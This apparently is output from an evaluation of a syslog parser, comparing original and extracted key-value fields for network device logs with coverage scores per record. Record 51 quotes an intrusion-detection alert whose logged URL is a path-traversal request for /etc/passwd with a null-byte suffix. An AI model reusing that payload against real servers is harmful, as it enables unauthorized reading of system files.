+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'echo'}, {'key': '', 'value': 'test'}, {'key': '', 'value': 'for'}, {'key': '', 'value': 'echo'}, {'key': '', 'value': 'test'}, {'key': '', 'value': 'for'}, {'key': '', 'value': 'Nov 18 15:16:01'}, {'key': '', 'value': '2024-11-18 15:15:46'}, {'key': '', 'value': '2024-11-18 15:15'}, {'key': '', 'value': '10.50.109.90:31003'}, {'key': '', 'value': '10.50.109.90:31003'}, {'key': '', 'value': '10-50-86-12'}]
+Coverage: 30.0%
+
+Record 51:
+Original: [{'key': '', 'value': 'Oct 21 09:54:15'}, {'key': '', 'value': '10-50-86-12'}, {'key': '发生时间', 'value': '2024-10-21 09:54:03'}, {'key': '威胁', 'value': '高'}, {'key': '事件', 'value': '检测通用文件读取'}, {'key': '请求方法', 'value': 'GET'}, {'key': 'URL地址', 'value': '10.50.109.2/includes/include.php?cct_base=../../../../../../../../../etc/passwd%00'}, {'key': '服务器IP', 'value': '10.50.109.2'}, {'key': '客户端IP', 'value': '10.50.86.35'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'DBAPPSecurity'}, {'key': '', 'value': 'Oct 21 09:54:15'}, {'key': '', 'value': '2024-10-21 09:54:03'}, {'key': '', 'value': '09:54:03,威胁/高,事件/检测通用文件读取,请求方法/GET,URL地址/10.50.109.2/includes/include.php?cct_base=../../../../../../../../../etc/passwd%00,POST数据/,服务器IP/10.50.109.2,主机名/10.50.109.2,服务器端口/80,客户端IP/10.50.86.35,客户端端口/44088,客户端环境/Mozilla/5.0'}, {'key': '', 'value': 'en'}, {'key': '', 'value': '2024-10-21 09:54'}, {'key': '', 'value': '10-50-86-12'}]
+Coverage: 33.3%
+
+Record 52:
+Original: [{'key': '', 'value': 'May 4 2018 02:14:05'}, {'key': '', 'value': 'E03-E04_GW_CE12808_01-stack'}, {'key': 'CID', 'value': '0x80130524'}, {'key': 'Peer', 'value': '3.3.3.3'}, {'key': 'VpnInstance', 'value': '_public_'}, {'key': 'Address Family', 'value': 'EVPN'}]
+Testing: [{'key': 'CID', 'value': '0x80130524'}, {'key': 'Peer', 'value': '3.3.3.3'}, {'key': 'VpnInstance', 'value': '_public_'}, {'key': 'Address Family', 'value': 'EVPN'}, {'key': '', 'value': 'marker'}, {'key': '', 'value': 'was'}, {'key': '', 'value': 'sent'}, {'key': '', 'value': 'to'}, {'key': '', 'value': 'the'}, {'key': '', 'value': 'Address'}, {'key': '', 'value': '4 2018 02:14:05'}, {'key': '', 'value': 'EOR_SENT'}, {'key': '', 'value': 'l'}]
+Coverage: 66.7%
+
+Record 53:
+Original: [{'key': '', 'value': 'Feb 11 2014 15:08:22'}, {'key': '', 'value': 'Core9300A'}, {'key': '', 'value': '6'}, {'key': 'Protocol', 'value': 'arp-reply'}, {'key': 'ExceededPacketCount', 'value': '012'}]
+Testing: [{'key': 'Protocol', 'value': 'arp'}, {'key': 'ExceededPacketCount', 'value': '012'}, {'key': '', 'value': 'Core9300A'}, {'key': '', 'value': 'of'}, {'key': '', 'value': 'packets'}, {'key': '', 'value': 'to'}, {'key': '', 'value': 'cpu'}, {'key': '', 'value': 'exceeded'}, {'key': '', 'value': 'the'}, {'key': '', 'value': 'CPCAR'}, {'key': '', 'value': 'limit'}, {'key': '', 'value': 'on'}, {'key': '', 'value': 'the'}, {'key': '', 'value': 'LPU'}, {'key': '', 'value': 'in'}, {'key': '', 'value': 'slot'}, {'key': '', 'value': 'Feb 11 2014 15:08:22'}, {'key': '', 'value': '11 2014 15:08:22'}, {'key': '', 'value': 'CPCAR_DROP_LPU'}, {'key': '', 'value': 'l'}]
+Coverage: 60.0%
+
+Record 56:
+Original: [{'key': '', 'value': 'Oct 27 2023 02:46:11'}, {'key': '', 'value': 'fw001.cn-lvliang-2'}, {'key': 'CID', 'value': '0x80b40442'}, {'key': 'UserName', 'value': 'eca'}, {'key': 'SourceAddress', 'value': '0.0.0.0'}, {'key': 'Method', 'value': 'POST'}, {'key': 'Accept', 'value': 'application/yang-data+xml'}, {'key': 'Url', 'value': '/restconf/operations/huawei-cli-inner:cli-terminal'}, {'key': 'Body', 'value': '<input><op-type>open</op-type></input>'}]
+Testing: [{'key': 'CID', 'value': '0x80b40442'}, {'key': 'UserName', 'value': 'eca'}, {'key': 'SourceAddress', 'value': '0.0.0.0'}, {'key': 'DestAddress', 'value': '127.0.0.1'}, {'key': 'VpnName', 'value': '_public_'}, {'key': 'SessionId', 'value': '9373'}, {'key': 'Method', 'value': 'POST'}, {'key': 'Accept', 'value': 'application/yang'}, {'key': 'ContentType', 'value': 'application/yang'}, {'key': 'Url', 'value': '/restconf/operations/huawei'}, {'key': 'FragIndex', 'value': '1'}, {'key': 'Body', 'value': '<input><op'}, {'key': '', 'value': 'operation'}, {'key': '', 'value': 'Oct 27 2023 02:46:11'}, {'key': '', 'value': '27 2023 02:46:11'}, {'key': '', 'value': 'OPS_RESTCONF_REQ'}, {'key': '', 'value': 's'}]
+Coverage: 55.6%
+
+Record 57:
+Original: [{'key': '', 'value': 'May 20 2016 16:50:33'}, {'key': '', 'value': 'KSIDC_ISSCLOUD_CORE_CE12804_01'}, {'key': 'CID', 'value': '0x80542724'}, {'key': 'InstanceID', 'value': '0'}, {'key': 'PortIndex', 'value': '183'}, {'key': 'PortName', 'value': 'Eth-Trunk10'}, {'key': 'PwName', 'value': '-'}]
+Testing: [{'key': 'CID', 'value': '0x80542724'}, {'key': 'InstanceID', 'value': '0'}, {'key': 'PortIndex', 'value': '183'}, {'key': 'IfIndex', 'value': '183'}, {'key': 'PortName', 'value': 'Eth'}, {'key': '', 'value': 'port'}, {'key': '', 'value': 'has'}, {'key': '', 'value': 'been'}, {'key': '', 'value': 'set'}, {'key': '', 'value': 'to'}, {'key': '', 'value': 'discarding'}, {'key': '', 'value': 'May 20 2016 16:50:33'}, {'key': '', 'value': '20 2016 16:50:33'}, {'key': '', 'value': 'PORT_STATE_DISCARDING'}, {'key': '', 'value': 'l'}]
+Coverage: 57.1%
+
+Record 58:
+Original: [{'key': '', 'value': 'Dec 12 2017 13:14:50'}, {'key': '', 'value': 'JLSZY-CORE-S12708-CSS'}, {'key': '', 'value': '8020'}, {'key': '', 'value': '20171211114646.jlszy-core-s12708-css.ziptmp'}]
+Testing: [{'key': '', 'value': 'JLSZY-CORE-S12708-CSS'}, {'key': '', 'value': 'backup'}, {'key': '', 'value': 'configuration'}, {'key': '', 'value': 'file'}, {'key': '', 'value': 'is'}, {'key': '', 'value': 'deleted'}, {'key': '', 'value': 'Dec 12 2017 13:14:50'}, {'key': '', 'value': '12 2017 13:14:50'}, {'key': '', 'value': 'BACKUPCONFIG_FILE_DELETE'}, {'key': '', 'value': 's'}]
+Coverage: 50.0%
+
+Record 59:
+Original: [{'key': '', 'value': 'Jul 14 2062 19:29:08'}, {'key': '', 'value': 'S5700-XiSuo_And_JiaoXian'}, {'key': '', 'value': '3673'}]
+Testing: [{'key': 'Threshold', 'value': '100 packets per second'}, {'key': '', 'value': 'of'}, {'key': '', 'value': 'global'}, {'key': '', 'value': 'icmp'}, {'key': '', 'value': 'packets'}, {'key': '', 'value': 'exceeds'}, {'key': '', 'value': 'the'}, {'key': '', 'value': 'packets'}, {'key': '', 'value': 'per'}, {'key': '', 'value': 'Jul 14 2062 19:29:08'}, {'key': '', 'value': '14 2062 19:29:08'}, {'key': '', 'value': 'ICMP_GLOBAL_RATELIMIT'}, {'key': '', 'value': 'l'}]
+Coverage: 33.3%
+
+Record 61:
+Original: [{'key': '', 'value': 'Jan 31 2023 08:26:45'}, {'key': '', 'value': 'F6A04/B04-INT1-BL-01/02'}, {'key': 'CID', 'value': '0x80030008'}, {'key': 'OID', 'value': '1.3.6.1.4.1.2011.5.25.19.2.1'}, {'key': 'LocalTime', 'value': '2023-01-31 16:26:4'}]
+Testing: [{'key': 'CID', 'value': '0x80030008'}, {'key': 'OID', 'value': '1.3.6.1.4.1.2011.5.25.19.2.1'}, {'key': 'LocalTime', 'value': '2023'}, {'key': '', 'value': 'local'}, {'key': '', 'value': 'time'}, {'key': '', 'value': 'is'}, {'key': '', 'value': 'changed'}, {'key': '', 'value': 'with'}, {'key': '', 'value': 'Jan 31 2023 08:26:45'}, {'key': '', 'value': '2023-01-31 16:26:45'}, {'key': '', 'value': '31 2023 08:26:45'}, {'key': '', 'value': '2023-01-31 16:26'}, {'key': '', 'value': 'hwSysClockChangedNotification'}, {'key': '', 'value': 't'}]
+Coverage: 60.0%
+
+Record 62:
+Original: [{'key': '', 'value': 'Oct 26 2023 10:00:05'}, {'key': '', 'value': 'fw001.cn-lvliang-2'}, {'key': 'CID', 'value': '0x80cb000c'}, {'key': 'OID', 'value': '1.3.6.1.4.1.2011.6.10.2.1'}, {'key': 'User name', 'value': '-'}, {'key': 'Session ID', 'value': '65535'}, {'key': 'Command source address', 'value': '0.0.0.0'}, {'key': 'Storage type', 'value': 'running'}]
+Testing: [{'key': 'CID', 'value': '0x80cb000c'}, {'key': 'OID', 'value': '1.3.6.1.4.1.2011.6.10.2.17'}, {'key': 'Internal change', 'value': 'True'}, {'key': 'Session ID', 'value': '65535'}, {'key': 'Command source address', 'value': '0.0.0.0'}, {'key': 'Storage type', 'value': 'running'}, {'key': 'Terminal type', 'value': '65535'}, {'key': '', 'value': 'configuration'}, {'key': '', 'value': 'change'}, {'key': '', 'value': 'User'}, {'key': '', 'value': 'name'}, {'key': '', 'value': 'Session'}, {'key': '', 'value': 'ID'}, {'key': '', 'value': 'Command'}, {'key': '', 'value': 'source'}, {'key': '', 'value': 'address'}, {'key': '', 'value': 'Storage'}, {'key': '', 'value': 'type'}, {'key': '', 'value': 'Terminal'}, {'key': '', 'value': 'type'}, {'key': '', 'value': 'Oct 26 2023 10:00:05'}, {'key': '', 'value': '26 2023 10:00:05'}, {'key': '', 'value': 'hwCfgConfigChangeLog'}, {'key': '', 'value': 't'}]
+Coverage: 62.5%
+
+Record 66:
+Original: [{'key': '', 'value': 'Dec 20 2017 11:55:34'}, {'key': '', 'value': 'ANC_FZ_OA_Out_SW_HW5720_01'}, {'key': '', 'value': '10983'}]
+Testing: [{'key': '', 'value': 'is'}, {'key': '', 'value': 'Dec 20 2017 11:55:34'}, {'key': '', 'value': '20 2017 11:55:34'}, {'key': '', 'value': 'RTC_FAULT'}, {'key': '', 'value': 'l'}]
+Coverage: 33.3%
+
+Record 67:
+Original: [{'key': '', 'value': 'Apr 14 2023 22:20:48+08:00'}, {'key': '', 'value': 'P3_7F-Office_A-01*2'}, {'key': '', 'value': '683685'}, {'key': '', 'value': '/snmpnotilog.txt'}, {'key': 'AccessMode', 'value': 'ReadWriteExclusive'}]
+Testing: [{'key': 'AccessMode', 'value': 'ReadWriteExclusive'}, {'key': '', 'value': 'to'}, {'key': '', 'value': 'was'}, {'key': '', 'value': 'Apr 14 2023 22:20:48'}, {'key': '', 'value': 'Apr 14 2023 22:20:48+0800'}, {'key': '', 'value': '14 2023 22:20:48'}, {'key': '', 'value': 'FILEACCESS_DENI'}, {'key': '', 'value': 'l'}]
+Coverage: 20.0%
+
+Record 70:
+Original: [{'key': '', 'value': 'Feb 11 2014 15:08:22+08:00'}, {'key': '', 'value': 'Core9300A'}, {'key': '', 'value': '6'}, {'key': 'UserName', 'value': 'admin'}, {'key': 'IPAddress', 'value': '10.37.42.2'}, {'key': 'FailureReason', 'value': 'verify code not match'}]
+Testing: [{'key': 'UserName', 'value': 'admin'}, {'key': 'IPAddress', 'value': '10.37.42.2'}, {'key': 'FailureReason', 'value': 'verify code not match'}, {'key': '', 'value': 'Core9300A'}, {'key': '', 'value': 'to'}, {'key': '', 'value': 'validate'}, {'key': '', 'value': 'HTTP'}, {'key': '', 'value': 'verification'}, {'key': '', 'value': 'code'}, {'key': '', 'value': 'not'}, {'key': '', 'value': 'Feb 11 2014 15:08:22'}, {'key': '', 'value': 'Feb 11 2014 15:08:22+0800'}, {'key': '', 'value': '11 2014 15:08:22'}, {'key': '', 'value': 'VERIFYFAIL'}, {'key': '', 'value': 'l'}]
+Coverage: 66.7%
+
+Record 71:
+Original: [{'key': '', 'value': 'Jul 26 2018 09:09:33'}, {'key': '', 'value': 'Huawei_12700'}, {'key': '', 'value': '3265991'}, {'key': 'Task', 'value': 'VT1'}, {'key': 'IP', 'value': '202.194.111.222'}, {'key': 'User', 'value': 'sdibt'}]
+Testing: [{'key': 'Task', 'value': 'VT1'}, {'key': 'IP', 'value': '202.194.111.222'}, {'key': 'User', 'value': 'sdibt'}, {'key': '', 'value': 'being'}, {'key': '', 'value': 'asked'}, {'key': '', 'value': 'whether'}, {'key': '', 'value': 'to'}, {'key': '', 'value': 'execute'}, {'key': '', 'value': 'the'}, {'key': '', 'value': 'command'}, {'key': '', 'value': 'telnet'}, {'key': '', 'value': 'server'}, {'key': '', 'value': 'the'}, {'key': '', 'value': 'user'}, {'key': '', 'value': 'chose'}, {'key': '', 'value': 'Jul 26 2018 09:09:33'}, {'key': '', 'value': '26 2018 09:09:33'}, {'key': '', 'value': 'CMDCONFIRM_RECORD'}, {'key': '', 'value': 's'}]
+Coverage: 66.7%
+
+Record 72:
+Original: [{'key': '', 'value': 'Jan 11 2013 08:00:19'}, {'key': '', 'value': 'HuaweiA'}, {'key': '', 'value': '128'}]
+Testing: [{'key': '', 'value': 'HuaweiA'}, {'key': '', 'value': 'interface'}, {'key': '', 'value': 'changed'}, {'key': '', 'value': 'the'}, {'key': '', 'value': 'Baud'}, {'key': '', 'value': 'from'}, {'key': '', 'value': 'to'}, {'key': '', 'value': 'Jan 11 2013 08:00:19'}, {'key': '', 'value': '11 2013 08:00:19'}, {'key': '', 'value': 'IF_INFO_CHANGE'}, {'key': '', 'value': 'l'}]
+Coverage: 66.7%
+
+Record 73:
+Original: [{'key': '', 'value': '2021-02-22 10:29:48'}, {'key': '', 'value': 'WT_BianJie_USG5310_A'}, {'key': 'DevIP', 'value': '172.28.18.62'}]
+Testing: [{'key': '-DevIP', 'value': '172.28.18.62'}, {'key': '', 'value': '2021-02-22 10:29:48'}, {'key': '', 'value': '2021-02-22 10:29'}, {'key': '', 'value': 'TRAPLOG'}, {'key': '', 'value': 'l'}]
+Coverage: 66.7%
+
+Record 74:
+Original: [{'key': '', 'value': '2015-12-28 06:16:28'}, {'key': '', 'value': 'USG6300'}, {'key': '', 'value': '2015-12-28 06:00:00'}, {'key': '', 'value': '192.168.1.100'}, {'key': '', 'value': '1022,8.8.8.123'}, {'key': '', 'value': 'test@163.com'}, {'key': '', 'value': 'mail,content'}, {'key': '', 'value': '/log/mailcontent_01.txt'}]
+Testing: [{'key': '', 'value': 'USG6300'}, {'key': '', 'value': '2015-12-28 06:16:28'}, {'key': '', 'value': '2015-12-28 06:16'}, {'key': '', 'value': '2015-12-28 06:00'}, {'key': '', 'value': 'test@163.com'}, {'key': '', 'value': 'mail,content'}, {'key': '', 'value': '/log/mailcontent_01.txt'}, {'key': '', 'value': 'MAIL'}, {'key': '', 'value': 'l'}]
+Coverage: 62.5%
+
+Record 75:
+Original: [{'key': '', 'value': 'Dec 16 2023 23:33:21+08:00'}, {'key': '', 'value': 'Office-P2_1F_Coffee-A-01'}, {'key': 'Client InterfaceName', 'value': 'Vlanif70'}, {'key': 'ServerId', 'value': '10.10.199.254'}, {'key': 'Acquired IpAddress', 'value': '10.10.198.123'}, {'key': 'Mask', 'value': '255.255.252.0'}, {'key': 'Static Route', 'value': '(destination: 0.0.0.0 mask: 0.0.0.0 next-hop: 10.10.199.254)'}, {'key': 'Lease Duration', 'value': '86400'}, {'key': 'DNS Server', 'value': '10.10.16.1, 10.10.16.2'}]
+Testing: [{'key': 'Client InterfaceName', 'value': 'Vlanif70'}, {'key': 'ServerId', 'value': '10.10.199.254'}, {'key': 'Acquired IpAddress', 'value': '10.10.198.123'}, {'key': 'Mask', 'value': '255.255.252.0'}, {'key': 'Gateway', 'value': '(10.10.199.254'}, {'key': 'Static Route', 'value': '(destination: 0.0.0.0 mask: 0.0.0.0 next'}, {'key': 'Lease Duration', 'value': '86400'}, {'key': 'DNS Server', 'value': '(10.10.16.1'}, {'key': 'DNS Domain', 'value': '('}, {'key': 'Cloud management URL', 'value': '('}, {'key': 'Option43', 'value': '('}, {'key': '', 'value': 'IP'}, {'key': '', 'value': 'address'}, {'key': '', 'value': 'lease'}, {'key': '', 'value': 'is'}, {'key': '', 'value': 'successfully'}, {'key': '', 'value': 'Acquired'}, {'key': '', 'value': 'Static'}, {'key': '', 'value': 'Lease'}, {'key': '', 'value': 'DNS'}, {'key': '', 'value': 'DNS'}, {'key': '', 'value': 'Cloud'}, {'key': '', 'value': 'management'}, {'key': '', 'value': 'Dec 16 2023 23:33:21'}, {'key': '', 'value': 'Dec 16 2023 23:33:21+0800'}, {'key': '', 'value': '16 2023 23:33:21'}, {'key': '', 'value': 'RENEW'}, {'key': '', 'value': 'l'}]
+Coverage: 55.6%
+
+Record 81:
+Original: [{'key': '', 'value': 'Oct 26 2023 08:33:12'}, {'key': '', 'value': 'fw001.cn-lvliang-2'}, {'key': 'UserType', 'value': 'SSH'}, {'key': 'UserName', 'value': 'wocloud-sxll'}, {'key': 'AuthenticationMethod', 'value': 'Local-user'}, {'key': 'RemoteIp', 'value': '192.168.228.125'}, {'key': 'VpnName', 'value': 'management'}, {'key': 'LocalIp', 'value': '10.14.41.2'}]
+Testing: [{'key': 'CID', 'value': '0x80ca2713'}, {'key': 'UserType', 'value': 'SSH'}, {'key': 'UserName', 'value': 'wocloud'}, {'key': 'AuthenticationMethod', 'value': '""Local'}, {'key': 'RemoteIp', 'value': '192.168.228.125'}, {'key': 'VpnName', 'value': 'management'}, {'key': 'LocalIp', 'value': '10.14.41.2'}, {'key': '', 'value': 'user'}, {'key': '', 'value': 'succeeded'}, {'key': '', 'value': 'in'}, {'key': '', 'value': 'logging'}, {'key': '', 'value': 'in'}, {'key': '', 'value': 'to'}, {'key': '', 'value': 'Oct 26 2023 08:33:12'}, {'key': '', 'value': '26 2023 08:33:12'}, {'key': '', 'value': 'LOGIN'}, {'key': '', 'value': 's'}]
+Coverage: 62.5%
+
+Record 85:
+Original: [{'key': '', 'value': 'Feb  7 2023 06:45:22'}, {'key': 'Slot', 'value': '1'}, {'key': 'Vcpu', 'value': '0'}, {'key': 'CarID', 'value': '7680'}, {'key': 'ExceededPacketCount', 'value': '2006'}, {'key': 'PacketInfo', 'value': 'The growth rate of top 1 packets is as follows'}, {'key': 'MAC1', 'value': '0000-5e00-0102'}, {'key': 'Protocol1', 'value': 'arp'}]
+Testing: [{'key': 'Slot', 'value': '1'}, {'key': 'Vcpu', 'value': '0'}, {'key': 'CarID', 'value': '7680'}, {'key': 'ExceededPacketCount', 'value': '2006'}, {'key': 'PacketInfo', 'value': 'The growth rate of top 1 packets is as follows: MAC1'}, {'key': 'Protocol1', 'value': 'arp'}, {'key': '', 'value': 'of'}, {'key': '', 'value': 'packets'}, {'key': '', 'value': 'to'}, {'key': '', 'value': 'cpu'}, {'key': '', 'value': 'exceeded'}, {'key': '', 'value': 'the'}, {'key': '', 'value': 'HOSTCAR'}, {'key': '', 'value': 'growth'}, {'key': '', 'value': 'rate'}, {'key': '', 'value': 'of'}, {'key': '', 'value': 'top'}, {'key': '', 'value': 'packets'}, {'key': '', 'value': 'is'}, {'key': '', 'value': 'as'}, {'key': '', 'value': '7 2023 06:45:22'}, {'key': '', 'value': 'HOSTCAR_DROPPKT'}, {'key': '', 'value': 'l'}]
+Coverage: 62.5%
+
+Record 87:
+Original: [{'key': '', 'value': 'Oct 26 2023 08:32:52'}, {'key': '', 'value': 'fw001.cn-lvliang-2'}, {'key': 'Service', 'value': 'nac_admin0'}]
+Testing: [{'key': 'Service', 'value': 'nac_admin0'}, {'key': '', 'value': 'Oct 26 2023 08:32:52'}, {'key': '', 'value': '2023-10-26 16:32:52'}, {'key': '', 'value': '26 2023 08:32:52'}, {'key': '', 'value': '2023-10-26 16:32'}, {'key': '', 'value': 'ADMIN_USER_OFFLINERESULT'}, {'key': '', 'value': 's'}]
+Coverage: 66.7%
+
+Record 89:
+Original: [{'key': '', 'value': 'Dec 20 2016 10:01:49'}, {'key': '', 'value': '11F-Dong'}, {'key': 'VS', 'value': 'Admin'}, {'key': 'VS-CID', 'value': '0x807f04b4'}, {'key': 'Slot', 'value': 'alarmID'}, {'key': '0x0c150009', 'value': 'ChassisID'}, {'key': '1', 'value': 'SlotID'}, {'key': '9', 'value': 'ObjectIndex'}, {'key': '158', 'value': 'DiscardedPackets'}, {'key': '2679202', 'value': 'DiscardedThreshold'}]
+Testing: [{'key': 'VS', 'value': 'Admin'}, {'key': 'VS-CID', 'value': '0x807f04b4'}, {'key': 'Slot', 'value': '9'}, {'key': 'alarmID', 'value': '0x0c150009'}, {'key': 'ChassisID', 'value': '1'}, {'key': 'SlotID', 'value': '9'}, {'key': 'ObjectIndex', 'value': '158'}, {'key': 'DiscardedPackets', 'value': '2679202'}, {'key': 'DiscardedThreshold', 'value': '1000000'}, {'key': 'ProtocalDescirption', 'value': 'Whitelist'}, {'key': 'Reason', 'value': 'The discarded rate for packets destined to CPU exceeded alarm threshold.'}, {'key': '', 'value': '11F-Dong'}, {'key': '', 'value': 'cpu-defend'}, {'key': '', 'value': 'drop'}, {'key': '', 'value': 'packets'}, {'key': '', 'value': 'discarded'}, {'key': '', 'value': 'rate'}, {'key': '', 'value': 'for'}, {'key': '', 'value': 'packets'}, {'key': '', 'value': 'destined'}, {'key': '', 'value': 'to'}, {'key': '', 'value': 'CPU'}, {'key': '', 'value': 'exceeded'}, {'key': '', 'value': 'alarm'}, {'key': '', 'value': 'Dec 20 2016 10:01:49'}, {'key': '', 'value': '20 2016 10:01:49'}, {'key': '', 'value': 'hwXQoSCpDefendDiscardedPacketAlarm_active'}, {'key': '', 'value': 'l'}]
+Coverage: 40.0%
+
+Record 92:
+Original: [{'key': '', 'value': 'Dec 22 2021 15:26:40+08:00'}, {'key': '', 'value': 'r-zhz6-bk'}, {'key': 'CID', 'value': '0x80c4046e-'}, {'key': 'Slot', 'value': '7'}, {'key': 'Interface', 'value': 'Eth-Trunk1'}, {'key': 'Location', 'value': 'GigabitEthernet7/0/2'}, {'key': 'Destination IP', 'value': '202.112.1.34'}]
+Testing: [{'key': 'CID', 'value': '0x80c4046e'}, {'key': 'Slot', 'value': '7'}, {'key': 'Slot', 'value': '7'}, {'key': 'Interface', 'value': 'Eth'}, {'key': 'Location', 'value': 'GigabitEthernet7/0/2'}, {'key': 'Source IP', 'value': '0.0.0.0'}, {'key': 'Destination IP', 'value': '202.112.1.34'}, {'key': 'Source Port', 'value': '0'}, {'key': 'Destination Port', 'value': '123'}, {'key': 'Protocol', 'value': '17'}, {'key': '', 'value': 'r-zhz6-bk'}, {'key': '', 'value': 'Operation'}, {'key': '', 'value': 'attack'}, {'key': '', 'value': 'defend'}, {'key': '', 'value': 'Dec 22 2021 15:26:40'}, {'key': '', 'value': 'Dec 22 2021 15:26:40+0800'}, {'key': '', 'value': '22 2021 15:26:40'}, {'key': '', 'value': 'SOCDEFEND'}, {'key': '', 'value': 's'}]
+Coverage: 57.1%
+
+Record 94:
+Original: [{'key': '', 'value': '2019-10-21 07:19:59'}, {'key': '', 'value': '10.191.73.202'}, {'key': '', 'value': '2019-10-21 15:19:57+08:00'}, {'key': '', 'value': '15:19:59+08:00'}, {'key': '', 'value': '73_XN21Q_OLT_1#5800'}, {'key': 'CID', 'value': '0x88b40001'}]
+Testing: [{'key': 'CID', 'value': '0x88b40001'}, {'key': '', 'value': '2019-10-21'}, {'key': '', 'value': '2019-10-21'}, {'key': '', 'value': 'IP'}, {'key': '', 'value': '2019-10-21'}, {'key': '', 'value': '2019-10-21 07:19:59'}, {'key': '', 'value': '2019-10-21 07:19'}, {'key': '', 'value': '2019-10-21 15:19'}, {'key': '', 'value': '2019-10-21 15:19'}, {'key': '', 'value': 'SYS_LOG'}, {'key': '', 'value': 'l'}]
+Coverage: 33.3%
+
+Record 96:
+Original: [{'key': '', 'value': 'Dec 6 2021 07:15:45'}, {'key': '', 'value': 'WUXI_FXW_RT_1'}, {'key': '', 'value': '3'}]
+Testing: [{'key': '', 'value': 'register'}, {'key': '', 'value': 'board'}, {'key': '', 'value': '14'}, {'key': '', 'value': '6 2021 07:15:45'}, {'key': '', 'value': 'ENTUP'}, {'key': '', 'value': 'l'}]
+Coverage: 0.0%
+
+Record 99:
+Original: [{'key': '', 'value': 'Jun 1 12:35:52 2000'}, {'key': '', 'value': '8F-S5120-A8'}, {'key': '-DevIP', 'value': '129.168.60.212'}]
+Testing: [{'key': '-DevIP', 'value': '129.168.60.212'}, {'key': '', 'value': '8F-S5120-A8'}, {'key': '', 'value': 'FIB'}, {'key': '', 'value': 'timer'}, {'key': '', 'value': 'log_fib'}, {'key': '', 'value': 'l'}]
+Coverage: 66.7%
+
+Record 100:
+Original: [{'key': '', 'value': 'Jun  4 2019 00:58:52'}, {'key': '', 'value': 'SD-RZ-ZYL-SR-1.MAN'}, {'key': '', 'value': '222079'}, {'key': 'InstanceId', 'value': '6'}, {'key': 'AcceptOrRejectFlag', 'value': 'Reject'}]
+Testing: [{'key': 'InstanceId', 'value': '6'}, {'key': 'AcceptOrRejectFlag', 'value': 'Reject'}, {'key': '', 'value': 'number'}, {'key': '', 'value': 'of'}, {'key': '', 'value': 'routes'}, {'key': '', 'value': 'in'}, {'key': '', 'value': 'VPN'}, {'key': '', 'value': 'instance'}, {'key': '', 'value': 'DCN-ITMS'}, {'key': '', 'value': 'was'}, {'key': '', 'value': 'which'}, {'key': '', 'value': 'reached'}, {'key': '', 'value': 'or'}, {'key': '', 'value': 'exceeded'}, {'key': '', 'value': 'the'}, {'key': '', 'value': 'maximum'}, {'key': '', 'value': 'value'}, {'key': '', 'value': '4 2019 00:58:52'}, {'key': '', 'value': 'INST_RCH_MAX_RT_LMT'}, {'key': '', 'value': 's'}]
+Coverage: 40.0%
+
+Total Bad Records: 76
